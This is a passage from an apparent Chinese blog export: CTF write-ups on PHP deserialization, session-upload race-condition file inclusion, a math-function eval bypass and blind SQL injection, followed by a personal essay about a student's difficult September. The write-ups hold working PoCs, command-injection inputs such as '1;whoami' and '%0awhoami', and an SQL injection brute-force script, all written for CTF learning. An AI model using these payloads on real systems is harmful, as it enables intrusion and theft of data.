__construct($file)&#123;</span><br><span class="line"> $this-&gt;file &#x3D; $file;</span><br><span class="line"> $this-&gt;token_flag &#x3D; $this-&gt;token &#x3D; md5(rand(1,10000));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">public function getFlag()&#123;</span><br><span class="line"> $this-&gt;token_flag &#x3D; md5(rand(1,10000));</span><br><span class="line"> if($this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;token_flag)</span><br><span class="line"> &#123;</span><br><span class="line"> if(isset($this-&gt;file))&#123;</span><br><span class="line"> echo @highlight_file($this-&gt;file,true);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br><span class="line">$a&#x3D;new Flag(&#39;flag.php&#39;);</span><br><span class="line">$a-&gt;token&#x3D;&amp;$a-&gt;token_flag;</span><br><span class="line">$b&#x3D;new Handle($a);</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p>第二个Poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Handle&#123;</span><br><span class="line">    private $handle;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        foreach(get_object_vars($this) as $k &#x3D;&gt; $v) &#123;</span><br><span class="line">            $this-&gt;$k &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;Waking up\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct($handle) &#123;</span><br><span class="line">        $this-&gt;handle &#x3D; $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $token;</span><br><span class="line">    public $token_flag;</span><br><span class="line"></span><br><span class="line">    function __construct($file)&#123;</span><br><span class="line">        $this-&gt;file &#x3D; $file;</span><br><span class="line">        $this-&gt;token_flag &#x3D; $this-&gt;token &#x3D; md5(rand(1,10000));</span><br><span class="line">        $this-&gt;token &#x3D; &amp;$this-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getFlag()&#123;</span><br><span class="line">        $this-&gt;token_flag &#x3D; md5(rand(1,10000));</span><br><span class="line">        if($this-&gt;token &#x3D;&#x3D;&#x3D; $this-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isset($this-&gt;file))&#123;</span><br><span class="line">                echo @highlight_file($this-&gt;file,true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$flag &#x3D; new Flag(&quot;flag.php&quot;);</span><br><span class="line">$handle &#x3D; new Handle($flag);</span><br><span class="line">echo serialize($handle).&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>第三种Poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file&#x3D;&quot;flag.php&quot;;</span><br><span class="line">    public $token_flag;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;token&#x3D;&amp;$this-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Handle&#123;</span><br><span class="line">    private $handle;</span><br><span class="line">    public function __construct($handle) &#123;</span><br><span class="line">        $this-&gt;handle &#x3D; $handle; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b&#x3D;new Handle(new Flag);</span><br><span class="line">print serialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里还可以把<code>construct</code>的参数<code>$handle</code>去掉去构造<code>Poc</code>，<strong>通过这道题我们不难看出，在php反序列化中construct的操作性是很强的，我们可以去掉construct魔术方法的参数，可以对任意对象的值进行修改，可以新增变量以及对变量赋值。</strong></p>
<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p><strong>利用条件竞争包含session文件</strong></p>
<p>这个是从这位师傅这里学到的<a href="http://12end.xyz/essay1/" target="_blank" rel="noopener">http://12end.xyz/essay1/</a>涨了很多姿势</p>
<p>首先我们来介绍一下这个漏洞原理(先看一下Session信息)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2qx32jlqzj31310bemyj.jpg" alt=""></p>
<p>漏洞点在于<code>session_upload_progress.enabled</code>为<code>On</code>时，<strong>当一个上传请求在处理中，如果Post一个与session.upload_progress.name值相同的变量，会自动添加到Session中去，所以我们可以通过这种方法来添加Session数据，并且数据会储存在session_save_path(文件包含利用点)，并且PHP_SESSION_UPLOAD_PROGRESS是一个常量，是session.upload_progress.name的默认值</strong></p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#39;</span><br><span class="line">r&#x3D;requests.session()</span><br><span class="line">headers&#x3D;&#123;</span><br><span class="line">    &quot;Cookie&quot;:&#39;PHPSESSID&#x3D;123&#39;</span><br><span class="line">&#125;</span><br><span class="line">def POST():</span><br><span class="line">    while True:</span><br><span class="line">        file&#x3D;&#123;</span><br><span class="line">            &quot;upload&quot;:(&#39;&#39;,&#39;&#39;)                                                    #上传无效的空文件</span><br><span class="line">        &#125;</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#39;&lt;?php readfile(&quot;.&#x2F;flag.php&quot;);?&gt;&#39;     #恶意进度信息，readfile将直接输出文件内容</span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files&#x3D;file,headers&#x3D;headers,data&#x3D;data)</span><br><span class="line"></span><br><span class="line">def READ():</span><br><span class="line">    while True:</span><br><span class="line">        event.wait()</span><br><span class="line">        t&#x3D;r.get(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?file&#x3D;..&#x2F;tmp&#x2F;tmp&#x2F;sess_123&quot;)</span><br><span class="line">        if &#39;flag&#39; not in t.text:</span><br><span class="line">            print(&#39;[+]retry&#39;)</span><br><span class="line">        else:</span><br><span class="line">            print(t.text)</span><br><span class="line">            event.clear()</span><br><span class="line">event&#x3D;threading.Event()</span><br><span class="line">event.set()</span><br><span class="line">threading.Thread(target&#x3D;POST,args&#x3D;()).start()</span><br><span class="line">threading.Thread(target&#x3D;READ,args&#x3D;()).start()</span><br><span class="line">threading.Thread(target&#x3D;READ,args&#x3D;()).start()</span><br><span class="line">threading.Thread(target&#x3D;READ,args&#x3D;()).start()</span><br></pre></td></tr></table></figure>

<p>在本地实验最终获得<code>Flag</code></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2qx4gp5n5j31fg0lbdiq.jpg" alt=""></p>
<p>对于本题目的思考:本题的非预期解是有一定的限制的，这里的<code>session储存文件路径</code>是默认的，而且<code>enable</code>选项是开启的(一般也都是开启的)，<strong>而且最重要的是没有设置session，让我们可以通过自己设置session进而包含session文件。</strong></p>
<h3 id="Lovemath"><a href="#Lovemath" class="headerlink" title="Lovemath"></a>Lovemath</h3><p>没做出来的题目,做一下记录。</p>
<p>题目源码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    &#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">    if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">        $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">        if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">            die(&quot;太长了不会算&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">            if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">                die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">        $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">        preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);</span><br><span class="line">        foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">            if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">                die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;帮你算出答案</span><br><span class="line">        eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>本题的绕过点有两个:<strong>第一个也就是长度限制，第二个是关键字符限制。</strong></p>
<p><strong>第一种解法：</strong></p>
<p>这里索要用到最重要的两个函数是<code>base_convert</code>与<code>hex2bin(自己构造--将十六进制转化为字符串)</code>与<code>dechex</code></p>
<p>考虑到字符的数量的限制，我们可以用<code>post</code>或者<code>get</code>，这样就可以将一部分内容放在<code>post</code>或<code>get</code>中，首先要去构造<code>_GET</code>,仅仅通过<code>base_convert</code>是肯定构造不出来的，因为<strong>没有任何进制中是有特殊字符的。</strong>这里学习到了一波<code>hex2bin</code>这个强大的函数–<code>将十六进制值转化为二进制字符串</code>。官方文档中例子如下：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2qx95xqo6j31030cv0th.jpg" alt=""></p>
<p>很明显这个函数可以转化出带有<strong>特殊字符</strong>的字符串。转化脚本如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">print libnum.s2n(&#39;_GET&#39;)</span><br></pre></td></tr></table></figure>

<p>先转化出<code>_GET</code>的十进制值<code>1598506324</code>，而后在php中进行进一步操作,而且<code>hex2bin</code>可以通过<code>base_convert去</code>构造，最终paylaod为：<code>base_convert(37907361743,10,36)(dechex(1598506324));</code>相当于<code>_GET</code>。</p>
<p>第二个需要知道的知识点为：用<code>{}</code>代替<code>[]</code>进行索引(只适用于高版本php)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rk6ykt0qj315e0imag7.jpg" alt=""></p>
<p>我们可以很明显的看到{}成功进行了索引。</p>
<p>最终payload为<code>abs=flag.php&amp;pow=show_source&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pow}($$pi{abs})</code></p>
<p>成功得到flag</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rk8ocklej30yh0h1t98.jpg" alt=""></p>
<p>最后对<code>eval和system</code>进行了一下探究,代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;eval命令回显:&quot;;</span><br><span class="line">eval(&#39;echo &#39;.$_GET[&#39;a&#39;].&#39;;&#39;);</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">echo &quot;system命令回显:&quot;;</span><br><span class="line">system(&#39;echo &#39;.$_GET[&#39;b&#39;].&#39;;&#39;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对于<code>eval</code>:将内部命令视为<strong>php代码</strong>去执行，并且一定要有分号结尾，例如可以通过<code>payload:1;system(&#39;whoami&#39;)</code>；去执行系统命令。还可以自由的进入和离开php模式，例如<code>payload:1;?&gt;&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<p>对于<code>system</code>:将内部命令当作<code>系统命令</code>去执行(这里就可以祭出我们的金手指<code>%0a</code>了)</p>
<p>,例如我们可以通过<code>1;whoami</code>去执行系统命令，也可以使用<code>1%0awhoami</code>去执行系统命令</p>
<p><strong>第二种解法：</strong></p>
<p>利用<code>getallheaders</code>从<code>header</code>里提取所需执行命令，例如<code>payload:system(getallheaders(){9})</code>,在header里面添加<code>9:cat flag.php</code>，偷一下图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190423105229-d59634a6-6572-1.png" alt="img"></p>
<p><code>getallheaders</code>这个姿势对于执行<code>php代码</code>的命令执行函数是相当有用的.如下</p>
<h3 id="全宇宙最简单的SQL注入"><a href="#全宇宙最简单的SQL注入" class="headerlink" title="全宇宙最简单的SQL注入"></a>全宇宙最简单的SQL注入</h3><p>又是一道没做出来的题(–菜),此题的问题出现在对于<strong>盲注报错的问题，</strong><code>对于盲注而言，如果ascii值不是正确的话，是不会报错的，返回的是empty set</code>。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkaimxe1j30n90cr795.jpg" alt=""></p>
<p>题目过滤了<code>benchmark if sleep</code>等盲注关键字，所以这里应该只能用布尔盲注了。并且在<code>username</code>处存在注入。</p>
<p>返回信息共有两种情况:</p>
<ul>
<li><strong>数据库操作错误</strong>:当输入<code>username=admin&#39;&amp;passwd=xxx</code>,也就是说当有sql语法错误时会回显数据库操作错误。</li>
<li><strong>登陆失败</strong>：当输入<code>username=admin&amp;passwd=xxx</code>,也就是说当没有sql语法错误时回显登陆失败</li>
</ul>
<p><code>and短路运算</code>：<strong>当and前面的值为假时不会再去运算and后面的表达式。</strong></p>
<p>之前其实只懂报错注入，但不太明白<strong>溢出报错与语法报错</strong>到底有什么区别，通过这道题大概明白了一些问题。如下可见</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkbbjaivj30nd08ltcy.jpg" alt=""></p>
<p>当我们想用<code>updatexml</code>进行报错的时候，无论中间的语句是<code>1=0</code>还是<code>1=1</code>，都会报错，这是因为<strong>利用语法报错的话，只要有语法错误就一定会报错。</strong></p>
<p>而溢出报错却会因为<code>and短路运算</code>而回显不一样的结果，如果前面的语句为假，则不会再执行后面的语句，但这里我发现了一个不是很懂的问题吧</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkc1ldt2j30n906rjuj.jpg" alt=""></p>
<p>首先对于1，2，<code>and短路运算</code>的真假指的是<code>1=0，1=1</code>，也就是说当1=0时，出现了假条件，不会去执行后面的溢出一句，<strong>但是对于下面的两句，个人认为应该是因为只要进行了一次查询就代表着前面的值为真，所以一定会执行后面的溢出语句。</strong></p>
<p>下面可以直接构造<code>payload</code>了，由于<code>or</code>被过滤了，那么<code>information_schema</code>和<code>password</code>字段就不可用了，所以这里还要进行学习一下<strong>Mysql如何在无列名的情况下完成注入，</strong>其实很简单的，放个截图就懂了。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkcr0gnaj313p0k7n6q.jpg" alt=""></p>
<p>还有个坑点…表名要靠猜…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and substr((select username from user),1,1)&#x3D;&#39;u&#39; and pow(999,100)</span><br></pre></td></tr></table></figure>

<p>返回数据库操作错误，也就意味着表名确实是<code>user</code>。写脚本跑一下user表里面的password字段。</p>
<p>太懒了(贴一下网上的脚本)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests,re</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;39.97.167.120:52105&quot;</span><br><span class="line">admin_pass &#x3D; &#39;&#39;</span><br><span class="line">charset &#x3D; &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$%&amp;\&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\]^_&#96;&#125;&#123;~#&#39;</span><br><span class="line">for i in range(1,100):</span><br><span class="line"> for char in charset:</span><br><span class="line"> if char &#x3D;&#x3D; &#39;#&#39;:</span><br><span class="line"> # print(&#39;#&#39;)</span><br><span class="line"> # print(admin_pass)</span><br><span class="line"> exit()</span><br><span class="line"> datas &#x3D; &#123;</span><br><span class="line"> &#39;username&#39; : &quot;admin&#39;^1 and substr((select &#96;2&#96; from (select 1,2 union select * from user)a limit 1,1),%d,1)&#x3D;&#39;%s&#39; and pow(9999,100)#&quot; % (i,char),</span><br><span class="line"> &#39;password&#39; : &#39;admin&#39;</span><br><span class="line"> &#125;</span><br><span class="line"> r &#x3D; requests.post(url&#x3D;url,data &#x3D; datas)</span><br><span class="line"> r.encoding &#x3D; r.apparent_encoding</span><br><span class="line"> if &#39;数据库操作失败&#39; in r.text:</span><br><span class="line"> # print(char)</span><br><span class="line"> admin_pass +&#x3D; char</span><br><span class="line"> print(admin_pass)</span><br><span class="line"> break</span><br></pre></td></tr></table></figure>

<p>逻辑还是很简单的，正常的sql注入脚本。主要是想记录一下其他师傅的姿势，利用其他函数如<code>cot</code>，<code>exp</code>函数进行报错注入，截图如下：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkdkf9utj30sf0gjjwa.jpg" alt=""></p>
<p>其实这里还可以用<code>exp(~(select*from(select user())x));</code>同样可以进行溢出报错。</p>
<h3 id="Refspace"><a href="#Refspace" class="headerlink" title="Refspace"></a>Refspace</h3><p>这道题只做到了利用<code>phar去getshelll</code>，剩下的php学的不到位..连wp看的都很懵.</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>自然选择号 前进四</title>
    <url>/2019/09/29/%E8%87%AA%E7%84%B6%E9%80%89%E6%8B%A9%E5%8F%B7-%E5%89%8D%E8%BF%9B%E5%9B%9B/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一直都有想写一篇随笔的想法，但是也没抽出时间来，今晚就先将学习暂且放下，写一些自己的内心想法来缓解一下自己的心情吧。</p>
<h3 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h3><p>这个九月对我来说，是一段难过，自闭，无奈的九月。</p>
<p><strong>8.18 踏上火车，离开家乡</strong></p>
<p><img src="https://s2.ax1x.com/2019/09/29/uGCCPU.jpg" alt="uGCCPU.jpg"></p>
<p>很幸运这次换到了24小时的火车，不再是36小时的车程了。一路昏昏沉沉，看到下铺那个长相可爱的女孩子和她男友的幸福样子，心里自然也有些羡慕，羡慕归羡慕，现实的冰冷瞬间将我从幻想中拉了出来，我还有补考工作和大作业以及200左右的课时点要去做，还需要准备一下过几天的XNUCA(当时很希望可以进决赛)，抱起火车上的枕头，又昏昏的睡了过去。</p>
<p><strong>8.18 终于到了南昌</strong></p>
<p>和家乡20度的温差还真是令人一时间无法接受，吹着炎热的夏风，略感疲倦的向学校走去。</p>
<p><strong>8.23 室友们陆续到了寝室，开始实训生活</strong></p>
<p>开始了漫长的且<del>无用</del>的实训生活，早上七点匆匆起床，来不及吃上早点就奔去教室，在嘈杂与喧闹中度过一天，晚上六点再次回到寝室，学习一些自己想学习的知识</p>
<p><strong>9.1 实训结束，开始正式上课</strong></p>
<p>…..</p>
<p>…..</p>
<p>时间线在匆忙中似乎已经到了九月末，此时的我略有些绝望，有时确实会感叹弱校与强校的差距，但这毕竟是现实，还是先说说这段时间的经历吧</p>
<ul>
<li>比赛情况：</li>
</ul>
<p>第五空间，ogeek，中关村创新比赛，XNUCA高校网安….，在这段时间所举行的所有赛事，没有一个成功进入决赛。</p>
<p>某审核，连续两次比赛无输出。</p>
<ul>
<li>生活情况：</li>
</ul>
<p>此时的我越来越焦虑，烦躁，一次一次的失败让我感觉有一些无奈和无力。</p>
<p>同时高中的心理问题再次复发：在接触内心认为是 “沙雕” 的人后，感觉非常难受，可能碰到一次后，会洗手十分钟到二十分钟，碰到衣服甚至想当场把衣服撕碎，每天没由来的烦躁不安。</p>
<p>从开始的不太接受熬夜，开始慢慢进行熬夜。</p>
<p>因为补考，虽然占着一个奖学金名额，但最终无法拿到奖学金，室友还是很优秀，一个特等，一个一等，（我真菜</p>
<p>和保研的学长聊了一下，学校的推免的问题，学长说最好绩点还是要达到3左右，光是竞赛是很难推免的，但是我上学期已经补考了orz…需要进行绩点补救的过程了。</p>
<p>身体素质感觉也变得很差，感觉有的时候接近抑郁了。</p>
<ul>
<li>感情情况</li>
</ul>
<p>我这个人似乎也没有什么感情邂逅，唯一令我疑惑不解的就是高中很喜欢的一个女孩子，前几天晚上的时候我翻说说的时候看到她和家乡一个技校的男生在一起了，我也没有什么看不起技校的观点，只是有些感叹：”年年岁岁花相似，岁岁年年人不同”。</p>
<p>有时候会想，为什么那几天会很难过呢，可能是没有真正的放下吧，我也不知道我是算痴情还是偏执，思考了一个晚上，最终将她的所有一切联系方式全部删除了，在某次大扫除中，也将她送给我的那本书扔掉了，脱手的那一瞬间，我扔掉的是什么呢，难道只是那个礼物吗，或许扔掉的是我的部分青春吧。</p>
<h3 id="一些反思"><a href="#一些反思" class="headerlink" title="一些反思"></a>一些反思</h3><p>也很久没有进行自我反思了，借着这个机会反思一下最近的生活，也反思一下自己。</p>
<p>时间如白驹过隙，恍惚间一年的时间过去了，也到了大二了。</p>
<p>收获了很多，也失去了很多，以往遇到一些有趣的事情，会想着分享给身边要好的人，现在点下分享按键，又会点击取消，不知该分享跟谁，大家似乎也都有了自己的生活，来往和交集也越来越少，只是偶尔寒暄几句，又匆匆道别，所有人似乎都陌生了一些，似乎我自己也是吧。</p>
<p>比赛的问题令人倒是很无奈，有些时候真的很羡慕那些强队，而我们还在为了一个实验室的建设而头疼(平时连一个学习的地方都找不到)，第五空间和xnuca因为二进制方面的问题，都和决赛差一点，每次比赛的时候，似乎感觉队伍是在抱着必不可能进决赛的想法去打..有点无奈，有时候不禁会抱怨一下…只和奖金和奖项差了那么一点点，但是为什么不去思考一下自己的原因呢，如果我在xnuca中能再弄出Hardjs不就可以进决赛了吗，如果在第五空间前，了解一下webin，那么二进制方面未必不能做出一道题，可能就进入决赛了，可惜这一切都是如果，最终还是个人能力的不足，我没有理由也没有能力去埋怨其他人。</p>
<p>我也试着每天努力的去克服自己的心理问题，在每一次心理对抗后，都感觉疲惫不堪</p>
<p>或许这就是生活吧，真的很让人难过，也很累。</p>
<p>或许在不断的绝望中，依然可以去抓住希望才是真正的生活吧，在生活中构建出自己心中的意义，去学习自己所热爱的东西，做自己喜欢的事情，正所谓</p>
<blockquote>
<p>世界上只有一种真正的英雄主义，就是认清了生活的真相后还依然热爱它</p>
</blockquote>
<p>接受生活给你的痛苦，起身再次前进，才正是要做的事情，少接触无意义的事情，多做一些有价值的，有趣的事情，是非成败转头空，青山依旧在，几度夕阳红。</p>
<p>寻找正确的方向，继续前行。</p>
<p>自然选择号，前进四。</p>
<p>​                                                                                                                                             2019.9.29</p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
</search>
